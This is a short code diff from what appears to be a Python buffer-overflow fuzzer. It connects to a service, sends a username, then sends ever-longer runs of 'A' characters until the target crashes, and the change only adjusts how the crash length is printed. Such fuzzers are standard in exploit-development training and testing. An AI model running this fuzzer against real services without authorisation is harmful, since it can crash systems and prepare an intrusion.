@@ -18,11 +18,11 @@ while True:
       s.recv(1024)
       s.send(uname + '\r\n') # Send the username
       s.recv(1024)
-      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+      print("Fuzzing with {} bytes".format(len(string)))
       s.send(bytes(string, "latin-1")) # Send the payload
       s.recv(1024)
   except:
-    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+    print("Fuzzing crashed at {} bytes".format(len(string)))
     sys.exit(0)
   string += 100 * "A"
   time.sleep(1)
